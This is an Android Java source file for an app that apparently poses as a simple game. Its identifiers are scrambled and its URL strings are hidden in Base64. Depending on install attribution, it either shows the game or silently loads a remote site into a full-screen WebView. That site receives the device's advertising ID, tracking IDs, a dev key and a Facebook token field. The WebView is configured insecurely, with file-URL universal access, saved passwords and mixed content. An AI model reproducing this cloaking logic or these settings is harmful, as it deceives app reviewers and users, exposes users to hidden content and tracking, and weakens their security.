package com.pirinc.zlot;

import static com.pirinc.zlot.AppPG.hfsgds;
import static com.pirinc.zlot.AppPG.vbhs;
import static com.pirinc.zlot.AppPG.bcgsa;
import static com.pirinc.zlot.AppPG.vbsga;
import static com.pirinc.zlot.AppPG.bcshw;
import static com.pirinc.zlot.AppPG.sads;
import static com.pirinc.zlot.AppPG.bsgaw;
import static com.pirinc.zlot.AppPG.bfgatw;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.ViewModelProvider;

import com.pirinc.zlot.model.ConnPG;
import com.pirinc.zlot.model.Dipp;
import com.pirinc.zlot.model.SavePG;
import com.pirinc.zlot.viewmodel.PGActivityViewModel;

public class PG extends AppCompatActivity {

    WebView webViewFullAppPG;
    public ValueCallback<Uri> cacsa;
    public Uri bdsa = null;
    public ValueCallback<Uri[]> njss;
    public String njsy;
    public static final int jush = 1;
    private String gsiw = "r";

    @Override
    public void onBackPressed() {
        if (webViewFullAppPG.isFocused() && webViewFullAppPG.canGoBack()) {
            webViewFullAppPG.goBack();
        }
    }


    @Override
    protected void onActivityResult(int njsya, int mshy, @Nullable Intent nhs) {
        if (njsya != jush || njss == null) {
            super.onActivityResult(njsya, mshy, nhs);
            return;
        }
        Uri[] udshs = null;
        if (mshy == Activity.RESULT_OK) {
            if (nhs == null) {
                if (njsy != null) {
                    udshs = new Uri[]{Uri.parse(njsy)};
                }
            } else {
                String dataString = nhs.getDataString();
                if (dataString != null) {
                    udshs = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        njss.onReceiveValue(udshs);
        njss = null;
        if (cacsa == null) {
            super.onActivityResult(njsya, mshy, nhs);
            return;
        }
        Uri njsy = null;
        try {
            if (mshy != RESULT_OK) {
                njsy = null;
            } else {
                njsy = nhs == null ? bdsa : nhs.getData();
            }
        } catch (Exception e) {
        }
        cacsa.onReceiveValue(njsy);
        cacsa = null;
    }

    PGActivityViewModel pgActivityViewModel;
    public static ConnPG connPG;
    public static String pac;
    ProgressBar progressBar;
    Button bbbSss, bbbCccc, bbbInternet;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.pg);

        pac = getPackageName();
        webViewFullAppPG = findViewById(R.id.webViewFullAppPG);
        webSettingsPG(webViewFullAppPG);
        progressBar = findViewById(R.id.progressBar);
        bbbSss = findViewById(R.id.bbbSss);
        bbbCccc = findViewById(R.id.bbbCccc);
        bbbInternet = findViewById(R.id.bbbInternet);
        bbbInternet.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), PG.class));
                finishAffinity();
            }
        });
        pgActivityViewModel = new ViewModelProvider
                .AndroidViewModelFactory(getApplication())
                .create(PGActivityViewModel.class);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    gsiw = pgActivityViewModel.getDataSave();
                } catch (Exception e) {

                }
            }
        }).start();

        if (sdaad()) {
            connPG = pgActivityViewModel.getCon();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (gsiw.equals("r")) {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Dipp dipp = pgActivityViewModel.getDip(connPG.getAsdw(), PG.this);
                                cvcv(dipp);
                            }
                        });
                    } else {
                        Log.d("weq", gsiw);
                        webViewFullAppPG.setVisibility(View.VISIBLE);
                        webViewFullAppPG.loadUrl(gsiw);
                    }

                }
            }, 1000);
        } else {
            bbbInternet.setVisibility(View.VISIBLE);
            progressBar.setVisibility(View.INVISIBLE);
        }

        bbbSss.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), MainActivity.class));
                finishAffinity();
            }
        });

        bbbCccc.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });

    }

    private void webSettingsPG(WebView webViewFullAppPG) {
        webViewFullAppPG.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewFullAppPG.getSettings().setJavaScriptEnabled(true);
        webViewFullAppPG.getSettings().setAllowContentAccess(true);
        webViewFullAppPG.getSettings().setLoadWithOverviewMode(true);
        webViewFullAppPG.getSettings().setEnableSmoothTransition(true);
        webViewFullAppPG.getSettings().setUseWideViewPort(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webViewFullAppPG, true);
        CookieManager.getInstance().setAcceptCookie(true);
        webViewFullAppPG.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewFullAppPG.getSettings().setSavePassword(true);
        webViewFullAppPG.getSettings().setDatabaseEnabled(true);
        webViewFullAppPG.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        webViewFullAppPG.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        webViewFullAppPG.getSettings().setAppCacheEnabled(true);
        webViewFullAppPG.getSettings().setLoadsImagesAutomatically(true);
        webViewFullAppPG.setSaveEnabled(true);
        webViewFullAppPG.getSettings().setMixedContentMode(0);
        webViewFullAppPG.setFocusable(true);
        webViewFullAppPG.getSettings().setSaveFormData(true);
        webViewFullAppPG.getSettings().setAllowFileAccess(true);
        webViewFullAppPG.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewFullAppPG.getSettings().setDomStorageEnabled(true);
        webViewFullAppPG.setFocusableInTouchMode(true);
        webViewFullAppPG.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                if (url.contains(decoderPG("ZXJyb3I9YXBwYWZBczNm")) || url.contains(decoderPG("ZGlzYWJsZWQuaHRtbA=="))) {

                    webViewFullAppPG.setVisibility(View.INVISIBLE);
                    bbbSss.setVisibility(View.VISIBLE);
                    bbbCccc.setVisibility(View.VISIBLE);
                    progressBar.setVisibility(View.INVISIBLE);
                    Log.d("weq","Bott");
                }
            }
        });
        webViewFullAppPG.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(WebView view,
                                             ValueCallback<Uri[]> filePath,
                                             FileChooserParams fileChooserParams) {
                if (njss != null) {
                    njss.onReceiveValue(null);
                }
                njss = filePath;
                Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                contentSelectionIntent.setType("*/*");
                Intent[] intentArray = new Intent[0];
                Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                chooserIntent.putExtra(Intent.EXTRA_TITLE, decoderPG("U2VsZWN0IE9wdGlvbjo="));
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
                startActivityForResult(chooserIntent, 1);
                return true;
            }
        });
    }

    private boolean sdaad() {
        String bgde = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager vdse = (ConnectivityManager) getSystemService(bgde);
        if (vdse.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }

    public static String parserPG(String sada) {
        String vfdsa;
        String vfaa;
        String vsdaw;
        String vdaw;
        String vdse;
        String vfsay;

        String[] bgsaf = sada.split("_");

        try {
            vfdsa = bgsaf[0];
        } catch (Exception e) {

            vfdsa = "";
        }
        try {
            vfaa = bgsaf[1];
        } catch (Exception e) {

            vfaa = "";
        }
        try {
            vsdaw = bgsaf[2];
        } catch (Exception e) {
            vsdaw = "";

        }
        try {
            vdaw = bgsaf[3];
        } catch (Exception e) {
            vdaw = "";

        }
        try {
            vdse = bgsaf[4];
        } catch (Exception e) {
            vdse = "";
            ;
        }
        try {
            vfsay = bgsaf[5];
        } catch (Exception e) {
            vfsay = "";

        }

        String dfds = decoderPG("P21lZGlhX3NvdXJjZT0=") + bcshw +
                decoderPG("JnN1YjE9") + vfdsa +
                decoderPG("JnN1YjI9") + vfaa +
                decoderPG("JnN1YjM9") + vsdaw +
                decoderPG("JnN1YjQ9") + vdaw +
                decoderPG("JnN1YjU9") + vdse +
                decoderPG("JnN1YjY9") + vfsay +
                decoderPG("JmNhbXBhaWduPQ==") + bsgaw +
                decoderPG("Jmdvb2dsZV9hZGlkPQ==") + sads +
                decoderPG("JmFmX3VzZXJpZD0=") + hfsgds +
                decoderPG("JmFmX2NoYW5uZWw9") + bfgatw +
                decoderPG("JmRldl9rZXk9") + decoderPG(vbsga) +
                decoderPG("JmJ1bmRsZT0=") + pac +
                decoderPG("JmZiX2FwcF9pZD0=") + connPG.getAsdw() +
                decoderPG("JmZiX2F0PQ==") + connPG.getNhsa();


        return dfds;
    }


    public static String decoderPG(String vdssf) {


        byte[] ccda = android.util.Base64.decode(vdssf, Base64.DEFAULT);
        return new String(ccda);
    }

    int count = 0;

    private void cvcv(Dipp dipp) {

        Handler handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!bcgsa.equals("-") || !dipp.getQqwqa().equals("-")) {

                    if (bcgsa.equals(decoderPG("Tm9uLW9yZ2FuaWM="))) {
                        String ewew = connPG.getBgayw() + vbhs;
                        Log.d("weq", "App" + ewew);
                        webViewFullAppPG.setVisibility(View.VISIBLE);
                        webViewFullAppPG.loadUrl(ewew);
                        SavePG savePG = new SavePG(ewew);
                        pgActivityViewModel.insertDataSave(savePG);
                        count = 5;

                    } else if (dipp.getVdse() != null) {
                        String gtre = connPG.getBgayw() + dipp.getQqwqa();
                        webViewFullAppPG.setVisibility(View.VISIBLE);
                        webViewFullAppPG.loadUrl(gtre);
                        SavePG savePG = new SavePG(gtre);
                        pgActivityViewModel.insertDataSave(savePG);
                        count = 5;
                        Log.d("weq", "Deep" + gtre);

                    } else {
                        if (connPG.getDae().equals("0")) {
                            bbbSss.setVisibility(View.VISIBLE);
                            bbbCccc.setVisibility(View.VISIBLE);
                            progressBar.setVisibility(View.INVISIBLE);
                            count = 5;
                            Log.d("weq", "game");
                        } else {

                            String sfre = connPG.getBgayw() + decoderPG("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                                    decoderPG("Jmdvb2dsZV9hZGlkPQ==") + sads +
                                    decoderPG("JmFmX3VzZXJpZD0=") + hfsgds +
                                    decoderPG("JmRldl9rZXk9") + decoderPG(vbsga) +
                                    decoderPG("JmJ1bmRsZT0=") + getPackageName() +
                                    decoderPG("JmZiX2FwcF9pZD0=") + connPG.getAsdw() +
                                    decoderPG("JmZiX2F0PQ==") + connPG.getNhsa();
                            webViewFullAppPG.setVisibility(View.VISIBLE);
                            webViewFullAppPG.loadUrl(sfre);
                            SavePG savePG = new SavePG(sfre);
                            pgActivityViewModel.insertDataSave(savePG);

                            Log.d("weq", "Org" + sfre);
                            count = 5;
                        }
                    }

                } else {
                }
                if (count != 5) {
                    handler.postDelayed(this::run, 1000);
                } else {
                    count = 0;
                }
            }
        });

    }
}
